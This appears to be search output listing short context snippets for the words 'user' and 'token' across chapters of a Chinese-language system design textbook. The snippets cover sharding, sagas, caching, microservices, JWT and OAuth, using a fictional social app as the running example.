  c08_b07.md: ...ue         ← sends welcome email (300ms — doesn't block the user)      Queue Consumer: Analytics Service         ← reads "us...
  c08_b07.md: ...er)      Queue Consumer: Analytics Service         ← reads "user.signup" event from queue         ← logs the event (50ms — d...
  c08_b07.md: ...om queue         ← logs the event (50ms — doesn't block the user)      Queue Consumer: Contact Notification Service...
  c08_b07.md: ...eue Consumer: Contact Notification Service         ← reads "user.signup" event from queue         ← notifies connected frien...
  c08_b07.md: ...← notifies connected friends (200ms — doesn't block the user)   用户体验到瞬时注册（PostgreSQL 插入 + 队列发布约 25ms）。后台工作——邮件、分析、通知——异步...
  c09_b08.md: ...源表达 CRUD 操作。       GET  /users/42                   → fetch user 42     POST /users                      → create a new user...
  c09_b08.md: ...user 42     POST /users                      → create a new user     PUT  /users/42                   → replace user 42's da...
  c09_b08.md: ...e a new user     PUT  /users/42                   → replace user 42's data     PATCH /users/42                  → partial up...
  c09_b08.md: ...ta     PATCH /users/42                  → partial update of user 42     DELETE /users/42/posts/101       → delete post 101 b...
  c09_b08.md: ...2     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信息。  **REST 的优点：**...
  c09_b08.md: ...取回不足问题。  在 GraphQL 中，客户端在查询中精确指定想要什么数据：       query {       user(id: 42) {         username         photoUrl         posts(l...
  c09_b09.md: ...etUserRequest {       int64 user_id = 1;     }      message User {       int64 id = 1;       string username = 2;       stri...
  c09_b09.md: ...e.js 等）的客户端和服务器代码。客户端调用 `userService.GetUser(request)` 并返回 `User` 对象——就像调用本地函数一样。  **gRPC 的优点：**  * 极快：二进制 Protobuf 序列化比 JSO...
  c09_b09.md: ...etUserRequest {       int64 user_id = 1;     }      message User {       int64 id = 1;       string username = 2;       stri...
  c09_b09.md: ...e.js 等）的客户端和服务器代码。客户端调用 `userService.GetUser(request)` 并返回 `User` 对象——就像调用本地函数一样。  **gRPC 的优点：**  * 极快：二进制 Protobuf 序列化比 JSO...
  c09_b15.md: ...:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章消息队列和第 7 章缓存）So...
  c10_b06.md: ..._v3.jpg' WHERE id = 42`。 6. 使用 Redis 使该用户资料缓存失效（第 7 章）：`DEL user:42:profile`。  照片服务工作流：  1. 用户请求 Alice 的资料页。 2. 应用返回资料页，包含 `...
  c10_b14.md: ...在 PostgreSQL `users` 表的 `photo_url` 列。该列包含在第 7 章的资料缓存中（key `user:{id}:profile`）。用户更新头像时，确保以下目标的正确操作顺序是什么：(a) 新照片已存储，(b) 数据库有...
  c10_b14.md: ...新 PostgreSQL 的 users.photo_url 为新 URL     3. 使 Redis 缓存 key user:42:profile 失效     4. （异步，通过消息队列）从对象存储删除旧照片   **为什么这个顺序重要：**...
  c11_b04.md: ...和管理。“登出用户 42 的所有会话”变成：按 user_id 过滤 `DEL session:*`（或维护反向索引 `user:42:sessions = [sess_id1, sess_id2, ...]`）。本地内存则需要向所有服务器广播登出...
  c11_b06.md: ...e 的账户。用 Redis 会话，这很简单：`DEL session:alice_session_id` 或 `DEL user:42:sessions`。Alice 的下一个请求找不到会话，被重定向到登录。  用 JWT，Alice 有一个 `"...
  c11_b13.md: ...def get_user_profile(user_id):         cache_key = f"user:{user_id}:profile"         cached = local_cache.get(cache_k...
  c11_b14.md: ...把新资料写入 PostgreSQL。 3. Server A 从**它自己的** `local_cache` 中删除 `user:42:profile`。 4. Server B 和 Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存...
  c11_b14.md: ...def get_user_profile(user_id):         cache_key = f"user:{user_id}:profile"         cached = redis.get(cache_key)...
  c12_b04.md: ...**基于范围的分片（range-based sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shar...
  c12_b04.md: ...）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shard 2；依此类推。这简单直观，也支持高效的范围查询（查找 u...
  c12_b04.md: ...到 600,000 之间的所有用户——显然全在 Shard 1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到...
  c12_b04.md: ...hard_number = hash(user_id) % num_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是...
  c12_b04.md: ...有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户按 user ID 哈希分片，这些人分布在所有 shard——你必须查询所有 shard 并合并结果。  **基于目录的分片（dir...
  c12_b04.md: ...sed sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同...
  c12_b05.md: ...Snap 团队决定对 `users` 和 `posts` 表按 `user_id` 做哈希分片，共 8 个 shard。user ID 对 8 取模决定用户的资料存在哪个数据库实例。  应用代码更新：涉及用户的每个数据库操作先计算 `shard_n...
  c12_b05.md: ...：“本周全球点赞数最高的 10 条帖子”。这个查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部...
  c12_b05.md: ...查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极...
  c12_b05.md: ...分片的表之间 JOIN 在单次查询中变得不可能——你必须执行多次查询，然后在应用代码中合并结果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard...
  c12_b05.md: ...后在应用代码中合并结果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOI...
  c12_b05.md: ...果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询...
  c12_b05.md: ...1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——更是设计约束。它迫使团队...
  c12_b05.md: ...Snap 团队决定对 `users` 和 `posts` 表按 `user_id` 做哈希分片，共 8 个 shard。user ID 对 8 取模决定用户的资料存在哪个数据库实例。  应用代码更新：涉及用户的每个数据库操作先计算 `shard_n...
  c12_b05.md: ...：“本周全球点赞数最高的 10 条帖子”。这个查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部...
  c12_b05.md: ...查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极...
  c12_b05.md: ...分片的表之间 JOIN 在单次查询中变得不可能——你必须执行多次查询，然后在应用代码中合并结果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard...
  c12_b05.md: ...后在应用代码中合并结果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOI...
  c12_b05.md: ...果。  再举个例子：“找出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询...
  c12_b05.md: ...1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——更是设计约束。它迫使团队...
  c12_b06.md: ...个 shard 的数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 →...
  c12_b06.md: ...的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `u...
  c12_b06.md: ...r_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几...
  c12_b06.md: ...据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动。  8 个...
  c13_b03.md: ...，有时叫“逆康威动作（Inverse Conway Maneuver）”，是设计你的组织以匹配你想要的架构。如果你想让 User 和 Payment 服务干净分离，就组建独立的团队并赋予独立所有权。架构会随之而来。...
  c13_b10.md: ...call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（API、工单）沟通，所以他们的软件组件也通过定义好的接口沟通。反之，如果...
  c13_b13.md: ...ocol Buffers 在端到端延迟上差别可忽略。  在特定场景下这个说法会崩：  **高容量服务间通信：** 如果 User Service 每秒处理 100,000 次请求，每次都需要序列化和反序列化中等复杂度的 JSON 对象（比如 2-5...
  c15_b01.md: ...段提交（第 12 章）可以原子地协调它们——但 Payment Service 使用不参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。Notification Service 使用邮件 API。这些系统...
  c15_b05.md: ...-|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `...
  c15_b05.md: ...Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `is_premium = false...
  c15_b05.md: ...SD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `is_premium = false` 3 | Notification Service | 发送确认邮件...
  c15_b05.md: ...起退款）。用户最终回到起点——不是高级版，也没被扣款。失败被记录。他们可以稍后重试。  但如果第 2 步失败（升级期间 User Service 宕机）呢？saga 补偿：撤销第 1 步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重...
  c15_b05.md: ...-|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `...
  c15_b05.md: ...Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `is_premium = false...
  c15_b05.md: ...SD 2 | User Service | 设置 user 42 的 `is_premium = true` | 设置 user 42 的 `is_premium = false` 3 | Notification Service | 发送确认邮件...
  c15_b05.md: ...起退款）。用户最终回到起点——不是高级版，也没被扣款。失败被记录。他们可以稍后重试。  但如果第 2 步失败（升级期间 User Service 宕机）呢？saga 补偿：撤销第 1 步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重...
  c15_b06.md: ...件，知道发生这些事件时该做什么。saga 的逻辑分布在这些服务之间：  1. Checkout Handler 发布 `user.upgrade.initiated` 事件。 2. Payment Service 监听 `user.upgrade....
  c15_b06.md: ...dler 发布 `user.upgrade.initiated` 事件。 2. Payment Service 监听 `user.upgrade.initiated`，扣款，并发布 `payment.charge.succeeded`（或 `pay...
  c15_b06.md: ...布 `payment.charge.succeeded`（或 `payment.charge.failed`）。 3. User Service 监听 `payment.charge.succeeded`，把用户更新为高级版，并发布 `user.u...
  c15_b06.md: .... User Service 监听 `payment.charge.succeeded`，把用户更新为高级版，并发布 `user.upgraded.to.premium`。 4. Notification Service 监听 `user.upgr...
  c15_b06.md: ...并发布 `user.upgraded.to.premium`。 4. Notification Service 监听 `user.upgraded.to.premium`，发送邮件。  补偿：如果 User Service 失败并发布 `user....
  c15_b06.md: ...fication Service 监听 `user.upgraded.to.premium`，发送邮件。  补偿：如果 User Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `use...
  c15_b06.md: ...`user.upgraded.to.premium`，发送邮件。  补偿：如果 User Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `user.upgrade.failed` 并发...
  c15_b06.md: ...ser Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `user.upgrade.failed` 并发起退款。   #### 定义：编舞  **编舞（Choreography）** 是...
  c15_b06.md: ...高级版升级编排器：  1. 调用 Payment Service：扣 9.99 USD。等待结果。 2. 若成功：调用 User Service：设置 `is_premium = true`。等待结果。 3. 若成功：调用 Notification...
  c15_b07.md: ...可能成为瓶颈（所有 saga 协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于...
  c15_b09.md: ...yment.charge.succeeded`。更新 saga 记录状态为 `PAYMENT_COMPLETE`。调用 User Service：“设置用户 42 为高级版，幂等键 `saga_7f3a9b2c_upgrade`。”  **第 6...
  c15_b09.md: ...ice：“设置用户 42 为高级版，幂等键 `saga_7f3a9b2c_upgrade`。”  **第 6 步：** User Service 更新用户，并向自己的 outbox 写入 `user.upgraded.to.premium` 事件。...
  c15_b09.md: ...c_upgrade`。”  **第 6 步：** User Service 更新用户，并向自己的 outbox 写入 `user.upgraded.to.premium` 事件。  **第 7 步：** 编排器收到 `user.upgraded.t...
  c15_b09.md: ...outbox 写入 `user.upgraded.to.premium` 事件。  **第 7 步：** 编排器收到 `user.upgraded.to.premium`。更新 saga 记录为 `USER_UPGRADED`。调用 Notific...
  c15_b12.md: ...存在）。发布 `follow.graph.updated` 事件，带上 `request_id`。  **第 2 步——User Service：** 监听 `follow.graph.updated`。为用户 77 递增 `follower_co...
  c15_b12.md: ...步成功后失败：Social Graph Service 发布 `follow.graph.update.failed`。User Service 监听该事件（它已从第 1 步事件知道请求）——但此情况下第 2 步尚未执行，所以无需补偿。`follo...
  c15_b12.md: ...的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service 返回错误）；(b) 支付成功但 User Service 不可用；(c) 所有步骤成功，但编排器在标记 saga 完成前崩溃。  提示  编排器必须持久化其状态...
  c15_b13.md: ...设置 `current_step = USER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PEN...
  c15_b13.md: ...SER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用 Notificatio...
  c15_b13.md: ...step = FAILED`。无需补偿——没有任何状态被改变。向客户端返回失败原因。  **失败场景 (b)：支付成功，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User...
  c15_b13.md: ...，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User Service——超时或报错。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = C...
  c15_b13.md: ...设置 `current_step = USER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PEN...
  c15_b13.md: ...SER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用 Notificatio...
  c15_b13.md: ...step = FAILED`。无需补偿——没有任何状态被改变。向客户端返回失败原因。  **失败场景 (b)：支付成功，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User...
  c15_b13.md: ...，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User Service——超时或报错。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = C...
  c15_b13.md: ...设置 `current_step = USER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PEN...
  c15_b13.md: ...SER_PENDING`，保存 `payment_result`。用幂等键调用 User Service。等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用 Notificatio...
  c15_b13.md: ...step = FAILED`。无需补偿——没有任何状态被改变。向客户端返回失败原因。  **失败场景 (b)：支付成功，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User...
  c15_b13.md: ...，User Service 不可用。** 编排器设置 `current_step = USER_PENDING`。调用 User Service——超时或报错。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = C...
  c16_b14.md: ...#### 应用问题  **Q1.** SocialSnap 的应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（...
  c16_b14.md: ...ing Service 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。...
  c16_b14.md: ...Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 = 0.99 × 0.99 = 0.9801。只要两个核...
  c17_b04.md: ...考虑请求失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日志：**       {...
  c17_b06.md: ...ed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每个服务都有自己的日志。如果请求慢，你需要知道哪个服务贡献了延迟。如果请求...
  c17_b06.md: ...T posts WHERE id IN (...) (25ms)             [85ms - 195ms] User Service: fetch_authors (110ms)               [88ms - 190ms]...
  c17_b06.md: ...无法讲述的故事：总请求耗时 245ms，大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据...
  c17_b06.md: ...部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据库查询是瓶颈。...
  c19_b11.md: ...信号泄露信息。  **API 枚举：** 如果你的用户资料端点是 `/users/12345`，且对不存在 ID 返回“User not found”，攻击者可以枚举所有用户 ID 来找到有效用户。使用不透明、非顺序的用户 ID（UUID 而非递增...
  c22_b02.md: ...million）并发 feed 观看者时，这是每小时 25 亿（2.5 billion）次数据库查询。即使对 per-user 帖子列表做激进缓存，读放大也巨大。   #### 根本张力  写时扇出用写入成本换读取速度。读时扇出用读取成本换写入速...
  c26_b01.md: ...od N`。若哈希产生均匀分布，键大致均匀分布在 N 个节点上。  问题：添加或删除节点时，N 改变。N=5 时，键 "user:123" 哈希到节点 2（hash("user:123") mod 5 = 2）。添加节点后 N=6，hash("us...
  c27_b04.md: ...#### v6 —— 第 16 章：微服务与可靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断...
  c27_b06.md: ...ce 开始——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险的迁移。  关键纪律：在新系统完全验证前...
  c27_b06.md: ...che-aside 用于 profile——以陈旧和缓存失效复杂度为代价获得低延迟读。”  **v5（分片）时：** “User 表分片（mod N）——写吞吐随分片扩展；跨分片查询需要应用层 join；分片数难以改变。”  **v6（微服务）时：...
  c27_b07.md: ...分解（v6）既是组织需要，也是技术需要。Feed Service 团队需要快速迭代排序算法，而无需等待完整单体部署周期。User Service 团队需要拥有自己的数据模型，而无需与四个其他团队协商 schema 变更。  教训：架构不是脱离构建和...
  c27_b10.md: ...#### 应用问题  **Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Se...
  c27_b10.md: ...vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕机时 User Service 显示什么？）；两个数据库管理；两条部署流水线。对安全与产品职责明确分离的 80 人团队，这次拆分可能值...
  c28_b02.md: ...lSnap 在 v6 有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取...
  c28_b20.md: ...的团队结构会自然产生该架构？应该何时创建每个团队？  **答案：** 60 名工程师时的目标架构：6 个服务（Auth、User、Product/Core、Notifications、Analytics、Platform/Infra），每个团队 1...
  c28_b20.md: ...。剩余 23 人拥有核心单体。这两个服务分离后，团队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 serv...

=== token (122 occurrences) ===
  c04_b06.md: ...数  对每一项，选择合适的一致性模型：  | 组件 | 一致性级别 | 理由 | |---|---|---| | 认证 token | 线性一致性 | 已撤销 token 仍被当作有效 = 安全事件 | | 用户资料（姓名、简介） | 读己之写 |...
  c04_b06.md: ...| 组件 | 一致性级别 | 理由 | |---|---|---| | 认证 token | 线性一致性 | 已撤销 token 仍被当作有效 = 安全事件 | | 用户资料（姓名、简介） | 读己之写 | 用户应看到自己编辑；别人看到 2–3 秒...
  c06_b03.md: ...资料缓存 60 秒；下次请求直接返回缓存版本，无需命中数据库。  **会话存储：** 按 session ID 存认证 token 和会话数据。任何应用服务器都能快速查找任何用户的会话，无需数据库查询。  **计数器和限流器：** Redis 的原子...
  c07_b17.md: ...本不能包含“你已关注 Alice”指示）   2. 没有个性化的“为你推荐”区块   3. 响应体中不能包含 CSRF token 或其他 per-user 安全令牌  已登录用户不能直接使用 CDN 缓存版本，因为他们期望页面显示他们与 Alice...
  c08_b14.md: ...的用户造成压力，他们可能已放弃并请求了第二个重置链接（造成重复）。对这些事件：以最高优先级立即处理，并在发送前验证重置 token 仍有效。如果已过期，生成新 token 或发送“你的重置链接已过期，请重新请求”消息。  **双因素认证码：** 6...
  c08_b14.md: ...二个重置链接（造成重复）。对这些事件：以最高优先级立即处理，并在发送前验证重置 token 仍有效。如果已过期，生成新 token 或发送“你的重置链接已过期，请重新请求”消息。  **双因素认证码：** 6 位 OTP 通常有效期为 30 秒到 5...
  c09_b10.md: ...所有日志——然后请求才到达业务逻辑代码。  **API 网关职责：**  **认证/授权：** 对每个请求验证 JWT token 或 API key。如果无效，立即拒绝。后端服务只收到已认证请求。  **限流：** 执行每用户或每 API key...
  c11_b06.md: ...Storage 中）并在每个请求中附带发送。服务器通过验证签名来验证 JWT（用 secret key 重新计算并比对 token 的签名）。如果签名有效，payload 数据就可信——服务器无需任何数据库或 Redis 查找就知道 user_id...
  c11_b06.md: ...9510400` 的 JWT（24 小时后过期）。24 小时内服务器没有任何办法让 JWT 失效，因为服务器没有已签发 token 的中心记录。“登出”只是删除客户端 cookie，但如果攻击者窃取了 Alice 的 JWT，他们会一直用到过期。...
  c11_b06.md: ...他们会一直用到过期。  存在 workaround：  * 短 JWT 过期时间（15 分钟）——需要 refresh token（自身带来复杂度） * Redis 中的“撤销列表”（被撤销 token ID 的集合）——但你重新引入了对 Redis...
  c11_b06.md: ...合）——但你重新引入了对 Redis 的依赖，部分抵消了无状态收益 * 轮换 secret key——让所有用户的所有 token 失效（强制全局登出）  这些 workaround 都不如 Redis 里的 session ID 干净，因为 ses...
  c11_b07.md: ...大或变化频繁 * 需要服务器端会话管理（例如，追踪每个用户的活跃会话）  **何时使用 JWT：**  * 短生命周期 token 可接受（15-60 分钟过期 + refresh token） * 服务间认证（微服务互相验证身份） * 无需撤销的无...
  c11_b07.md: ...跃会话）  **何时使用 JWT：**  * 短生命周期 token 可接受（15-60 分钟过期 + refresh token） * 服务间认证（微服务互相验证身份） * 无需撤销的无状态 API 场景 * 大规模系统，即使每次请求 1ms 的...
  c11_b10.md: ...| ↑（跨服务器一致会话） | ↑（会话经受服务器故障） | ↑（Redis 集群运维、会话 TTL 管理） JWT Token（无状态认证） | ↓（每次请求无 Redis 查找） | ↓（无即时撤销） | ↑（无会话存储依赖） | ↑（密钥管理...
  c11_b10.md: ...↓（每次请求无 Redis 查找） | ↓（无即时撤销） | ↑（无会话存储依赖） | ↑（密钥管理、refresh token 流程）  水平扩展这一行展示了本章核心 tradeoff（权衡）：可用性大幅提升、吞吐空间大幅增加，换取运维复杂度显著...
  c11_b12.md: ...**答案：** **JWT（JSON Web Token）** 是一个紧凑、加密签名的 token，直接把会话 payload（user ID、username、过期时间等）包...
  c11_b12.md: ...**答案：** **JWT（JSON Web Token）** 是一个紧凑、加密签名的 token，直接把会话 payload（user ID、username、过期时间等）包含在 token 自身中。服务器在登录时创...
  c11_b12.md: ...是一个紧凑、加密签名的 token，直接把会话 payload（user ID、username、过期时间等）包含在 token 自身中。服务器在登录时创建 payload 并用 secret key 签名。后续请求中，服务器通过重新计算签名并比对...
  c11_b12.md: ...一前失效：  * 等待过期时间（如果 token 有效期 24 小时则不可接受） * 维护撤销列表（Redis 中失效 token ID 的集合）——重新引入 Redis 依赖 * 轮换签名密钥——让所有用户的所有 token 全局失效  撤销列表...
  c11_b12.md: ...表（Redis 中失效 token ID 的集合）——重新引入 Redis 依赖 * 轮换签名密钥——让所有用户的所有 token 全局失效  撤销列表 workaround 部分抵消了 JWT 的无状态收益。对于安全事件需要立即终止会话的应用（金融...
  c11_b18.md: ...操作——使它成为需要快速共享存储的多个组件的正确工具。  **JWT** 为服务端会话提供无状态替代方案：会话数据存在 token 自身中，通过加密验证而无需 Redis 查找。代价是撤销问题——JWT 不能立即失效。对大多数安全事件需要立即终止会话...
  c16_b18.md: ...最后写入获胜。账户余额（关键）则把冲突提交给人工操作员手动解决。  **对关键数据避免主主：** 对财务数据、用户认证 token 以及其他冲突会灾难性的数据，使用主备（一个数据中心写，另一个是只读副本）。主主适用于冲突可容忍的数据——社交互动、分析...
  c17_b06.md: ...Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子...
  c19_b02.md: ...务需要不同数据库访问级别  把认证和授权视为恰好一起使用的独立系统。   ### 19.2 OAuth 2.0 与基于 token 的认证  SocialSnap 的第三方开发者 API 需要一种机制，让用户向应用授予有限访问而不共享密码。与第三方应...
  c19_b03.md: ...er。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access toke...
  c19_b03.md: ...oken 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 acces...
  c19_b03.md: ...er，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization...
  c19_b03.md: ...和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并...
  c19_b03.md: ...s token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 re...
  c19_b03.md: ...er eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token...
  c19_b03.md: ...限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享...
  c19_b03.md: ...token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持...
  c19_b03.md: ...。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostSche...
  c19_b03.md: ...权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Toke...
  c19_b03.md: ...r 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT...
  c19_b03.md: ...#### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT...
  c19_b03.md: ...签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——...
  c19_b03.md: ...`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——关于用户和 token 的断言）：       {       "sub": "user_8821934",       "name": "A...
  c19_b03.md: ...}   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF2...`  Feed Service...
  c19_b03.md: ...Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `use...
  c19_b03.md: ...ope` 而无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是无状态认证：服务器不需要查数据库来验证 token。token 是自包含的。   #### JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤...
  c19_b03.md: ...无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是无状态认证：服务器不需要查数据库来验证 token。token 是自包含的。   #### JWT 安全考虑  JWT 有一个重大限制：一旦签发，除非到期，否则无法单独撤销。如果用户...
